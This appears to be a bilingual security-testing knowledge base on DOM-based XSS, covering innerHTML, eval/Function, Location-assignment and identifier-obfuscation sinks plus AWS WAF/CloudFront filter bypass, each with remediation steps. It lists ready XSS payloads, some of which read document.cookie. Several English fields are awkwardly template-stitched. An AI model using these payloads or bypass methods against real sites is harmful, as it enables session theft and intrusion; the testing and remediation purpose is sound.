title.zh: 替换危险 API 并复测
title.en: Retest the Inner HTML Data-Flow Injection remediation boundary

description.zh: 默认改用 textContent；需要结构化 UI 时通过 createElement 绑定固定属性，或在 Trusted Types 策略中调用维护中的 HTML 消毒器；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the source value, inner HTML assignment, newly created event attribute, and unique execution marker form a reproducible client-side chain no longer appears.

overview.zh: innerHTML 数据流注入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：location.hash、search、href 或 URL 数据是否未经净化写入 innerHTML，并通过新建元素事件形成执行路径。适用前提为：应用将数据与标记拼接后赋给 innerHTML，误以为浏览器不执行插入的 script 就能阻止所有 XSS。DOM XSS 的证据标准是：源值、innerHTML 赋值点、新建事件属性和唯一执行标记构成可复现的完整客户端链路；服务器响应不包含载荷并不能排除客户端问题。
overview.en: Inner HTML Data-Flow Injection checks whether location.hash, search, href, or URL data is written to inner HTML without sanitization and becomes executable through events on newly created elements. It applies when the application concatenates data into inner HTML and incorrectly assumes that non-execution of inserted script elements prevents all XSS. A conclusion requires the source value, inner HTML assignment, newly created event attribute, and unique execution marker form a reproducible client-side chain; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：应用将数据与标记拼接后赋给 innerHTML，误以为浏览器不执行插入的 script 就能阻止所有 XSS。审计应围绕“location.hash、search、href 或 URL 数据是否未经净化写入 innerHTML，并通过新建元素事件形成执行路径”记录源值、解码次数、赋值 API 与执行上下文。只有取得“源值、innerHTML 赋值点、新建事件属性和唯一执行标记构成可复现的完整客户端链路”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when the application concatenates data into inner HTML and incorrectly assumes that non-execution of inserted script elements prevents all XSS, allowing whether location.hash, search, href, or URL data is written to inner HTML without sanitization and becomes executable through events on newly created elements. Review the input source, final parsing context, browser or policy version, and the source value, inner HTML assignment, newly created event attribute, and unique execution marker form a reproducible client-side chain; otherwise record only an unconfirmed control differential.

exploitation.zh: 对每个 location 来源使用独立标记，断点观察赋值前的解码值和赋值后的 DOM；重点检查 img、svg 等事件节点而非仅测试 script。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, use a separate marker for each location source, inspect decoded values before assignment and DOM after assignment, and test event-capable nodes such as img and svg rather than script alone. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 默认改用 textContent；需要结构化 UI 时通过 createElement 绑定固定属性，或在 Trusted Types 策略中调用维护中的 HTML 消毒器。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should prefer text Content, construct structured UI with create Element and fixed attributes, or invoke a maintained HTML sanitizer inside an enforced Trusted Types policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: eval 与 Function 动态代码注入
name.en: Eval and Function Dynamic Code Injection

description.zh: 覆盖 eval、Function、字符串定时器等动态求值 sink，验证可控 URL 或字符串是否被解释为 JavaScript 源代码。
description.en: Covers eval, Function, and string-based timer sinks to test whether controllable UR Ls or strings are interpreted as Java Script source code.

prerequisites.zh: 可控值进入 eval、Function 构造器或字符串定时器的第一个参数，且不是仅存在危险 API 的静态代码。
prerequisites.en: A controllable value reaches the first argument of eval, the Function constructor, or a string timer rather than merely coexisting with a dangerous API in static code.

prerequisites.zh: 对动态求值 API 启用调用跟踪和参数哈希，测试代码只设置一次性内存 marker，并捕获 CSP unsafe-eval 行为。
prerequisites.en: Dynamic-evaluation APIs have call tracing and argument hashes, test code only sets a one-time in-memory marker, and CSP unsafe-eval behavior is captured.

title.zh: eval/Function注入

execution.command:
javascript:eval('alert(1)')
javascript:eval('alert(document.domain)')
javascript:eval('alert(document.cookie)')
javascript:Function('alert(1)')()
javascript:Function('alert(document.domain)')()
javascript:Function('alert(document.cookie)')()
javascript:setTimeout('alert(1)',0)
javascript:setTimeout('alert(document.domain)',0)
javascript:setTimeout('alert(document.cookie)',0)
javascript:setInterval('alert(1)',0)
javascript:setInterval('alert(document.domain)',0)
javascript:setInterval('alert(document.cookie)',0)
javascript:void(eval('alert(1)'))
javascript:void(eval('alert(document.domain)'))
javascript:void(eval('alert(document.cookie)'))

description.zh: eval/Function注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: eval/Function contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是带可控来源标记的字符串由真实动态 sink 编译执行并设置 marker，source、sink 参数、CSP 状态和调用栈完整关联。 假阳性边界：危险函数存在但只接收常量、字符串到达 sink 前被 JSON 解析、语法错误、unsafe-eval 阻断或手工 DevTools 执行都不能证明注入。
analysis.en: Positive evidence requires a source-tagged controllable string to be compiled by the real dynamic sink and set the marker, correlating source, sink argument, CSP state, and call stack. False-positive boundary: A dangerous function receiving only constants, a string parsed as JSON before the sink, a syntax error, unsafe-eval blocking, or manual Dev Tools execution does not prove injection.

opsecTips.zh: 动态求值测试禁止访问全局敏感对象或构造系统/网络动作；出现定时器残留、异常 worker、外连或状态修改时停止。
opsecTips.en: Dynamic-evaluation testing must not access sensitive globals or construct system or network actions; stop on residual timers, unexpected workers, egress, or state modification.

opsecTips.zh: 撤销 eval/Function/timer instrumentation，取消所有测试定时器和 worker，清除 marker 状态并重新载入应用确认调用路径正常。
opsecTips.en: Remove eval, Function, and timer instrumentation, cancel all test timers and workers, clear marker state, and reload the application to confirm normal call paths.

title.zh: 追踪“eval 与 Function 动态代码注入”的客户端来源
title.en: Scope the Eval and Function Dynamic Code Injection data flow

description.zh: 从 URL、消息或接口值单步跟踪到实际 DOM API，核对前提“客户端把配置、URL 或消息数据当作表达式拼接，且 CSP 仍允许 unsafe-eval 或代码路径没有受类型约束”及所有中间解码步骤。
description.en: Trace the real input to the final sink or policy decision, confirm that client code concatenates configuration, URL, or message data as an expression while CSP allows unsafe-eval or the path lacks a typed boundary, and record browser, response-header, and relevant component versions.

title.zh: 断点核对“动态 JavaScript 求值” Sink
title.en: Establish the Dynamic Java Script Evaluation baseline

description.zh: 在读取点和写入点记录运行时值、调用栈与最终 DOM，并采用“动态求值函数的调用栈、传入源码和唯一执行标记可关联，并排除浏览器地址栏主动阻止 javascript URL 的情况”作为成立标准。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation as valid evidence.

title.zh: 单变量验证“eval 与 Function 动态代码注入”
title.en: Run a single-variable Eval and Function Dynamic Code Injection check

description.zh: 对每种 sink 设置断点，从真实数据源跟踪参数；先提交算术表达式确认求值，再使用原集合的无害标记验证是否具备任意代码语义；保持页面状态不变，逐个来源和 sink 重放原样例，排除导航与 CSP 阻断差异。
description.en: break on each sink and trace arguments from the real source, first confirming evaluation with arithmetic before using harmless markers from the original set to establish arbitrary-code semantics; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
javascript:eval('alert(1)')
javascript:eval('alert(document.domain)')
javascript:eval('alert(document.cookie)')
javascript:Function('alert(1)')()
javascript:Function('alert(document.domain)')()
javascript:Function('alert(document.cookie)')()
javascript:setTimeout('alert(1)',0)
javascript:setTimeout('alert(document.domain)',0)
javascript:setTimeout('alert(document.cookie)',0)
javascript:setInterval('alert(1)',0)
javascript:setInterval('alert(document.domain)',0)
javascript:setInterval('alert(document.cookie)',0)
javascript:void(eval('alert(1)'))
javascript:void(eval('alert(document.domain)'))
javascript:void(eval('alert(document.cookie)'))

title.zh: 替换危险 API 并复测
title.en: Retest the Eval and Function Dynamic Code Injection remediation boundary

description.zh: 移除字符串求值，改为固定函数映射、JSON.parse 和类型化消息；删除 unsafe-eval，并使用 Trusted Types 或静态分析阻止新 sink；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation no longer appears.

overview.zh: eval 与 Function 动态代码注入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：不可信字符串是否到达 eval、Function、setTimeout 或 setInterval 的代码参数并在页面 origin 中求值。适用前提为：客户端把配置、URL 或消息数据当作表达式拼接，且 CSP 仍允许 unsafe-eval 或代码路径没有受类型约束。DOM XSS 的证据标准是：动态求值函数的调用栈、传入源码和唯一执行标记可关联，并排除浏览器地址栏主动阻止 javascript URL 的情况；服务器响应不包含载荷并不能排除客户端问题。
overview.en: Eval and Function Dynamic Code Injection checks whether an untrusted string reaches the code argument of eval, Function, set Timeout, or set Interval and is evaluated in the page origin. It applies when client code concatenates configuration, URL, or message data as an expression while CSP allows unsafe-eval or the path lacks a typed boundary. A conclusion requires the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：客户端把配置、URL 或消息数据当作表达式拼接，且 CSP 仍允许 unsafe-eval 或代码路径没有受类型约束。审计应围绕“不可信字符串是否到达 eval、Function、setTimeout 或 setInterval 的代码参数并在页面 origin 中求值”记录源值、解码次数、赋值 API 与执行上下文。只有取得“动态求值函数的调用栈、传入源码和唯一执行标记可关联，并排除浏览器地址栏主动阻止 javascript URL 的情况”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when client code concatenates configuration, URL, or message data as an expression while CSP allows unsafe-eval or the path lacks a typed boundary, allowing whether an untrusted string reaches the code argument of eval, Function, set Timeout, or set Interval and is evaluated in the page origin. Review the input source, final parsing context, browser or policy version, and the dynamic-evaluation call stack, source argument, and unique execution marker correlate, excluding cases where the browser blocks a javascript URL at navigation; otherwise record only an unconfirmed control differential.

exploitation.zh: 对每种 sink 设置断点，从真实数据源跟踪参数；先提交算术表达式确认求值，再使用原集合的无害标记验证是否具备任意代码语义。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, break on each sink and trace arguments from the real source, first confirming evaluation with arithmetic before using harmless markers from the original set to establish arbitrary-code semantics. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 移除字符串求值，改为固定函数映射、JSON.parse 和类型化消息；删除 unsafe-eval，并使用 Trusted Types 或静态分析阻止新 sink。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should remove string evaluation in favor of fixed function maps, JSON.parse, and typed messages; remove unsafe-eval and use Trusted Types or static analysis to prevent new sinks. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: Location 活动方案赋值

description.zh: 验证 location、href、assign 与 replace 接收可控 javascript URL 时的导航和执行行为，区分 DOM XSS 与普通开放重定向。
description.en: Tests navigation and execution when location, href, assign, or replace receives a controllable javascript URL, distinguishing DOM XSS from an ordinary open redirect.

prerequisites.zh: 应用真实代码将可控值赋给 location、href、assign 或 replace，且能够区分赋值来源、目标 scheme 与浏览器导航策略。
prerequisites.en: Real application code assigns a controllable value to location, href, assign, or replace, with assignment source, destination scheme, and browser navigation policy distinguishable.

prerequisites.zh: 导航 API 已加只读跟踪，普通 HTTPS 跳转使用自有空页面，javascript 分支仅设置一次性 marker，并保护测试页面状态。
prerequisites.en: Navigation APIs have read-only tracing, ordinary HTTPS redirects use an owned empty page, javascript branches set only a one-time marker, and test-page state is protected.

title.zh: location赋值
title.en: Validation step 1 for Location Active-Scheme Assignment

description.zh: location赋值包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Location Active-Scheme Assignment validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是受控 javascript scheme 经应用赋值后在当前文档来源执行 marker；若只导航到 HTTPS 目标，应单独归类开放重定向。 假阳性边界：href 字符串显示、浏览器阻止活动 scheme、用户在地址栏手工执行、只发生普通跨源跳转或 CSP 告警都不是 location XSS。
analysis.en: Positive evidence requires the controlled javascript scheme to execute the marker in the current document origin after application assignment; navigation only to an HTTPS target is classified separately as open redirect. False-positive boundary: Displayed href text, browser blocking of an active scheme, manual address-bar execution, ordinary cross-origin navigation, or a CSP alert is not location-based XSS.

opsecTips.zh: Location 测试启用导航拦截并限制一次；出现历史循环、页面卸载、真实业务状态丢失、下载或非测试域跳转时停止。
opsecTips.en: Location testing intercepts navigation and permits one attempt; stop on history loops, page unload, loss of real business state, downloads, or navigation to a non-test domain.

opsecTips.zh: 恢复导航 API、原始 URL、history 与路由状态，关闭自有目标页，清理 BFCache/站点数据并重新进入测试流程。
opsecTips.en: Restore navigation APIs, the original URL, history, and routing state, close the owned target page, clear BFCache and site data, and re-enter the test flow.

title.zh: 追踪“Location 活动方案赋值”的客户端来源
title.en: Scope the Location Active-Scheme Assignment data flow

description.zh: 从 URL、消息或接口值单步跟踪到实际 DOM API，核对前提“跳转逻辑缺少 URL 解析与协议、origin 允许列表，只通过前缀或字符串替换判断安全目标”及所有中间解码步骤。
description.en: Trace the real input to the final sink or policy decision, confirm that redirect logic lacks parsed protocol and origin allowlists and relies only on prefixes or string replacement to classify safe destinations, and record browser, response-header, and relevant component versions.

title.zh: 断点核对“DOM 导航 Sink” Sink
title.en: Establish the DOM Navigation Sink baseline

description.zh: 在读取点和写入点记录运行时值、调用栈与最终 DOM，并采用“最终 URL、导航类型和页面 origin 中的唯一标记分别记录；仅跳往外部 HTTPS 地址只能证明重定向”作为成立标准。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the final URL, navigation type, and unique marker in the page origin are recorded separately; navigation to external HTTPS alone proves only a redirect as valid evidence.

title.zh: 单变量验证“Location 活动方案赋值”
title.en: Run a single-variable Location Active-Scheme Assignment check

description.zh: 对 href 赋值、assign 和 replace 分别使用同源 HTTPS、跨源 HTTPS 与活动方案基线，记录浏览器差异和用户手势要求；保持页面状态不变，逐个来源和 sink 重放原样例，排除导航与 CSP 阻断差异。
description.en: compare same-origin HTTPS, cross-origin HTTPS, and active-scheme baselines across href assignment, assign, and replace while recording browser differences and gesture requirements; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
javascript:location='javascript:alert(1)'
javascript:location='javascript:alert(document.domain)'
javascript:location='javascript:alert(document.cookie)'
javascript:location.href='javascript:alert(1)'
javascript:location.href='javascript:alert(document.domain)'
javascript:location.href='javascript:alert(document.cookie)'
javascript:location.assign('javascript:alert(1)')
javascript:location.assign('javascript:alert(document.domain)')
javascript:location.assign('javascript:alert(document.cookie)')
javascript:location.replace('javascript:alert(1)')
javascript:location.replace('javascript:alert(document.domain)')
javascript:location.replace('javascript:alert(document.cookie)')
javascript:window.location='javascript:alert(1)'
javascript:window.location='javascript:alert(document.domain)'
javascript:window.location='javascript:alert(document.cookie)'
javascript:document.location='javascript:alert(1)'
javascript:document.location='javascript:alert(document.domain)'
javascript:document.location='javascript:alert(document.cookie)'

title.zh: 替换危险 API 并复测
title.en: Retest the Location Active-Scheme Assignment remediation boundary

description.zh: 使用 URL 构造器解析目标，只允许明确的 https/http origin 与路径；不要把原始用户值传给 Location API，并在跳转前绑定服务端生成的目标 ID；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the final URL, navigation type, and unique marker in the page origin are recorded separately; navigation to external HTTPS alone proves only a redirect no longer appears.

overview.zh: Location 活动方案赋值审查客户端源到 sink 的完整数据流。需要确认的核心行为为：应用是否把攻击者控制的字符串直接赋给 Location API，并允许 javascript 或其他活动方案在目标页面上下文执行。适用前提为：跳转逻辑缺少 URL 解析与协议、origin 允许列表，只通过前缀或字符串替换判断安全目标。DOM XSS 的证据标准是：最终 URL、导航类型和页面 origin 中的唯一标记分别记录；仅跳往外部 HTTPS 地址只能证明重定向；服务器响应不包含载荷并不能排除客户端问题。
overview.en: Location Active-Scheme Assignment checks whether an application assigns an attacker-controlled string directly to a Location API and permits javascript or another active scheme to execute in the target page context. It applies when redirect logic lacks parsed protocol and origin allowlists and relies only on prefixes or string replacement to classify safe destinations. A conclusion requires the final URL, navigation type, and unique marker in the page origin are recorded separately; navigation to external HTTPS alone proves only a redirect; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：跳转逻辑缺少 URL 解析与协议、origin 允许列表，只通过前缀或字符串替换判断安全目标。审计应围绕“应用是否把攻击者控制的字符串直接赋给 Location API，并允许 javascript 或其他活动方案在目标页面上下文执行”记录源值、解码次数、赋值 API 与执行上下文。只有取得“最终 URL、导航类型和页面 origin 中的唯一标记分别记录；仅跳往外部 HTTPS 地址只能证明重定向”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when redirect logic lacks parsed protocol and origin allowlists and relies only on prefixes or string replacement to classify safe destinations, allowing whether an application assigns an attacker-controlled string directly to a Location API and permits javascript or another active scheme to execute in the target page context. Review the input source, final parsing context, browser or policy version, and the final URL, navigation type, and unique marker in the page origin are recorded separately; navigation to external HTTPS alone proves only a redirect; otherwise record only an unconfirmed control differential.

exploitation.zh: 对 href 赋值、assign 和 replace 分别使用同源 HTTPS、跨源 HTTPS 与活动方案基线，记录浏览器差异和用户手势要求。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, compare same-origin HTTPS, cross-origin HTTPS, and active-scheme baselines across href assignment, assign, and replace while recording browser differences and gesture requirements. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 使用 URL 构造器解析目标，只允许明确的 https/http origin 与路径；不要把原始用户值传给 Location API，并在跳转前绑定服务端生成的目标 ID。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should parse destinations with the URL constructor, allow only explicit https/http origins and paths, never pass raw user values to Location APIs, and bind redirects to server-generated destination IDs. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: JavaScript 标识符混淆变体

description.zh: 使用 String.fromCharCode、字符串拼接和 Function 构造等方式重建调用，验证只识别危险关键字的过滤策略是否可绕过。
description.en: Reconstructs calls through String.from Char Code, concatenation, and Function construction to test filters that recognize only dangerous keywords.

prerequisites.zh: 目标防护主要依赖危险标识符黑名单，可控表达式在过滤后仍进入可执行 JavaScript 上下文或动态求值 sink。
prerequisites.en: The target defense relies mainly on dangerous-identifier blacklisting, and the controlled expression still reaches executable Java Script or a dynamic-evaluation sink after filtering.

prerequisites.zh: 已记录 String.fromCharCode、字符串拼接或 Function 构造前后的源码值，marker 仅修改隔离页面中的固定布尔标志。
prerequisites.en: Source values before and after String.from Char Code, string concatenation, or Function construction are recorded, and the marker only changes a fixed Boolean in the isolated page.

title.zh: JS混淆技术
title.en: Validation step 1 for Java Script Identifier Obfuscation Variants

description.zh: JS混淆技术包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Java Script Identifier Obfuscation Variants validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是混淆表达式通过目标过滤，运行时重建危险调用并执行 marker，且反混淆值、执行 sink 与来源能连续关联。 假阳性边界：过滤器未告警、字符串成功拼接、反混淆工具得到 alert 文本、CSP 阻断或表达式只作为数据显示均不是执行证据。
analysis.en: Positive evidence requires the obfuscated expression to pass the target filter, reconstruct the dangerous call at runtime, and execute the marker, continuously correlating deobfuscated value, execution sink, and source. False-positive boundary: No filter alert, successful string concatenation, an alert string produced by a deobfuscator, CSP blocking, or display as data is not execution evidence.

opsecTips.zh: 标识符混淆验证不得重建 cookie、storage、网络或系统 API；发现动态导入、外连、全局原型修改或循环执行时停止。
opsecTips.en: Identifier-obfuscation validation must not reconstruct cookie, storage, network, or system APIs; stop on dynamic imports, egress, global prototype changes, or execution loops.

opsecTips.zh: 删除混淆脚本和 marker 变量，恢复全局对象/原型，清理脚本缓存并重载页面后用普通 JavaScript 业务路径回归。
opsecTips.en: Delete obfuscated scripts and marker variables, restore global objects and prototypes, clear script caches, reload, and regress normal Java Script business paths.

title.zh: 固定“JavaScript 标识符混淆变体”处理链版本
title.en: Scope the Java Script Identifier Obfuscation Variants data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“攻击者已控制 JavaScript 执行上下文，而防护把风险简化为 alert、eval 等字面关键字，没有消除代码注入 sink”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that the attacker already controls a Java Script execution context while defenses reduce risk to literal tokens such as alert or eval instead of removing the code-injection sink, and record browser, response-header, and relevant component versions.

title.zh: 关联“JavaScript 词法混淆”多层基线
title.en: Establish the Java Script Lexical Obfuscation baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“混淆表达式的运行时值、实际调用目标与唯一执行标记可在调试器中还原，不能仅凭 WAF 放行认定漏洞”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the runtime value, actual call target, and unique execution marker can be reconstructed in the debugger; WAF acceptance alone is not a vulnerability as valid evidence.

title.zh: 逐变换验证“JavaScript 标识符混淆变体”
title.en: Run a single-variable Java Script Identifier Obfuscation Variants check

description.zh: 在确认可执行的 sink 中先测试直接调用，再逐个替换字符编码、属性拼接和 Function 构造，定位是哪一种词法规则产生差异；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: in a confirmed executable sink, test a direct call first and then substitute character encoding, property concatenation, and Function construction one at a time to locate the differing rule; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 统一规范化并回归
title.en: Retest the Java Script Identifier Obfuscation Variants remediation boundary

description.zh: 从根本上移除用户可控代码上下文，采用固定调用映射和数据序列化；服务端与前端都不要依赖危险函数名黑名单；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the runtime value, actual call target, and unique execution marker can be reconstructed in the debugger; WAF acceptance alone is not a vulnerability no longer appears.

overview.zh: JavaScript 标识符混淆变体评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：运行时重建的函数名和参数是否绕过静态字符串规则，同时保持与直接调用相同的执行语义。成立前提为：攻击者已控制 JavaScript 执行上下文，而防护把风险简化为 alert、eval 等字面关键字，没有消除代码注入 sink。最终必须取得以下证据：混淆表达式的运行时值、实际调用目标与唯一执行标记可在调试器中还原，不能仅凭 WAF 放行认定漏洞。
overview.en: Java Script Identifier Obfuscation Variants checks whether runtime reconstruction of function names and arguments bypasses static string rules while retaining the semantics of a direct call. It applies when the attacker already controls a Java Script execution context while defenses reduce risk to literal tokens such as alert or eval instead of removing the code-injection sink. A conclusion requires the runtime value, actual call target, and unique execution marker can be reconstructed in the debugger; WAF acceptance alone is not a vulnerability; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：攻击者已控制 JavaScript 执行上下文，而防护把风险简化为 alert、eval 等字面关键字，没有消除代码注入 sink。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“运行时重建的函数名和参数是否绕过静态字符串规则，同时保持与直接调用相同的执行语义”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when the attacker already controls a Java Script execution context while defenses reduce risk to literal tokens such as alert or eval instead of removing the code-injection sink, allowing whether runtime reconstruction of function names and arguments bypasses static string rules while retaining the semantics of a direct call. Review the input source, final parsing context, browser or policy version, and the runtime value, actual call target, and unique execution marker can be reconstructed in the debugger; WAF acceptance alone is not a vulnerability; otherwise record only an unconfirmed control differential.

exploitation.zh: 在确认可执行的 sink 中先测试直接调用，再逐个替换字符编码、属性拼接和 Function 构造，定位是哪一种词法规则产生差异。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“混淆表达式的运行时值、实际调用目标与唯一执行标记可在调试器中还原，不能仅凭 WAF 放行认定漏洞”完成确认。
exploitation.en: In an authorized isolated environment, in a confirmed executable sink, test a direct call first and then substitute character encoding, property concatenation, and Function construction one at a time to locate the differing rule. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 从根本上移除用户可控代码上下文，采用固定调用映射和数据序列化；服务端与前端都不要依赖危险函数名黑名单。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should remove user-controlled code contexts, use fixed call maps and data serialization, and avoid dangerous-function-name blacklists on both server and client. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: AWS WAF/CloudFront XSS 规范化差异
name.en: AWS WAF and Cloud Front XSS Normalization Differential

description.zh: 以 CRLF、引号闭合和 URL 编码 SVG 等小型样例验证 CloudFront 前置 AWS WAF 与源站、浏览器之间的规范化差异。
description.en: Uses compact CRLF, quote-closure, and URL-encoded SVG samples to compare normalization across Cloud Front, AWS WAF, the origin, and the browser.

prerequisites.zh: 请求通过目标 CloudFront distribution 与 AWS WAF Web ACL 到达自有源站，规则组、转换和缓存键配置均可核验。
prerequisites.en: Requests traverse the target Cloud Front distribution and AWS WAF web ACL to an owned origin, with rule groups, transformations, and cache-key configuration verifiable.

prerequisites.zh: 边缘日志、源站原始值/规范值、响应字节和浏览器 DOM 使用同一请求 ID，并有被阻断危险基线与普通输入基线。
prerequisites.en: Edge logs, origin raw and canonical values, response bytes, and browser DOM share one request identifier, with a blocked-dangerous baseline and benign-input baseline.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性证据是某规范化变体穿过实际 AWS WAF/CloudFront 路径，源站将其输出为活动上下文，浏览器随后执行 marker；三层证据缺一不可。 假阳性边界：边缘返回 200、只绕过单条规则、直接源站请求、缓存旧响应、源站编码输入或浏览器不执行均不是完整 XSS 绕过。
analysis.en: Positive evidence requires a normalization variant to pass the real AWS WAF and Cloud Front path, be emitted by the origin into an active context, and execute the browser marker; evidence from all three layers is required. False-positive boundary: An edge HTTP 200, bypass of one rule only, direct-origin access, a cached old response, origin encoding, or no browser execution is not a complete XSS bypass.

opsecTips.zh: AWS WAF 差异验证只在专用路径和低速率进行；发现生产缓存命中、真实用户请求、规则自动更新或源站压力时停止。
opsecTips.en: AWS WAF differential validation uses a dedicated path at low rate; stop on production cache hits, real-user requests, automatic rule updates, or origin pressure.

opsecTips.zh: 撤销测试规则/日志增强，失效专用 CloudFront 缓存对象，删除源站测试记录和浏览器 marker，并重放边缘基线。
opsecTips.en: Revert test rules and enhanced logging, invalidate dedicated Cloud Front cache objects, delete origin test records and browser markers, and replay edge baselines.

title.zh: Cloudfront WAF绕过
title.en: Validation step 1 for AWS WAF and Cloud Front XSS Normalization Differential

description.zh: Cloudfront WAF绕过，共4条
description.en: bypass payloads

title.zh: 固定“AWS WAF/CloudFront XSS 规范化差异”处理链版本
title.en: Scope the AWS WAF and Cloud Front XSS Normalization Differential data flow

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“Web ACL 的转换顺序或匹配范围与源站解码链不一致，且应用最终把参数放入可执行 HTML 上下文”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that Web ACL transformation order or match scope differs from the origin decoding chain and the application finally places the parameter in an executable HTML context, and record browser, response-header, and relevant component versions.

title.zh: 关联“AWS WAF 差异测试”多层基线
title.en: Establish the AWS WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“同一请求的边缘动作日志、源站接收值、响应 DOM 与唯一执行标记可以通过请求 ID 关联”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only edge action logs, the origin-received value, response DOM, and unique execution marker for one request correlate through a request identifier as valid evidence.

title.zh: 逐变换验证“AWS WAF/CloudFront XSS 规范化差异”
title.en: Run a single-variable AWS WAF and Cloud Front XSS Normalization Differential check

description.zh: 在测试 Web ACL 中逐项记录 URL_DECODE、HTML_ENTITY_DECODE 等转换顺序，分别提交原始和单层编码样例，并对比源站日志与浏览器 DOM；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
